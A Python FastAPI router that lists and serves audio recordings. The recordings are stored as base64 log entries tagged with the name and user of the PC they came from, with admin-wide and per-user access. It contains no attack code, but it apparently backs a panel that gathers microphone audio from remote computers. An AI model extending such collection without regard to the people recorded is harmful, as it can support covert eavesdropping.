from typing import Any
from fastapi import APIRouter, Depends, HTTPException, Query
from fastapi.responses import Response
from sqlalchemy.orm import Session
from app.api import deps
from app.core.database import get_db
from app.models.user import User, Log
import json
import base64

router = APIRouter()


@router.get("")
def list_audio_recordings(
    current_user: User = Depends(deps.get_current_user),
    db: Session = Depends(get_db),
    limit: int = 50,
) -> Any:
    """List all audio recordings"""
    query = db.query(Log).filter(Log.log_type == 'audio')
    
    # User isolation - admins see all
    if not current_user.is_admin:
        query = query.filter(Log.user_id == current_user.id)
    
    recordings = query.order_by(Log.created_at.desc()).limit(limit).all()
    
    return {
        "success": True,
        "recordings": [
            {
                "id": rec.id,
                "pc_name": rec.pc_name or 'Unknown',
                "pc_user": rec.pc_user or 'Unknown',
                "created_at": rec.created_at.isoformat() if rec.created_at else None
            }
            for rec in recordings
        ]
    }


@router.get("/latest")
def get_latest_audio(
    player: str = Query(None),
    current_user: User = Depends(deps.get_current_user),
    db: Session = Depends(get_db),
) -> Any:
    """Get the latest audio recording, optionally for a specific player"""
    query = db.query(Log).filter(Log.log_type == 'audio')
    
    # User isolation
    if not current_user.is_admin:
        query = query.filter(Log.user_id == current_user.id)
    
    # Filter by player if provided
    if player:
        query = query.filter(
            (Log.pc_name.ilike(f'%{player}%')) | 
            (Log.pc_user.ilike(f'%{player}%'))
        )
    
    recording = query.order_by(Log.created_at.desc()).first()
    
    if not recording:
        return {"success": False, "error": "No audio recordings found"}
    
    # Try to extract audio data
    try:
        content = json.loads(recording.content) if recording.content else {}
        audio_b64 = content.get('audio', content.get('data', ''))
        
        return {
            "success": True,
            "id": recording.id,
            "pc_name": recording.pc_name,
            "pc_user": recording.pc_user,
            "audio": audio_b64,
            "created_at": recording.created_at.isoformat() if recording.created_at else None
        }
    except:
        return {
            "success": True,
            "id": recording.id,
            "pc_name": recording.pc_name,
            "pc_user": recording.pc_user,
            "audio": None,
            "created_at": recording.created_at.isoformat() if recording.created_at else None
        }


@router.get("/file/{log_id}")
def get_audio_file(
    log_id: int,
    current_user: User = Depends(deps.get_current_user),
    db: Session = Depends(get_db),
):
    """Get audio file by log ID"""
    log = db.query(Log).filter(Log.id == log_id, Log.log_type == 'audio').first()
    
    if not log:
        raise HTTPException(status_code=404, detail="Audio recording not found")
    
    # User isolation
    if not current_user.is_admin and log.user_id != current_user.id:
        raise HTTPException(status_code=403, detail="Access denied")
    
    # Parse content to get base64 audio
    try:
        content = json.loads(log.content)
        audio_b64 = content.get('audio', content.get('data', ''))
        
        if not audio_b64:
            raise HTTPException(status_code=404, detail="No audio data")
        
        # Remove data URL prefix if present
        if ',' in audio_b64:
            audio_b64 = audio_b64.split(',')[1]
        
        audio_data = base64.b64decode(audio_b64)
        
        return Response(content=audio_data, media_type="audio/wav")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error: {str(e)}")
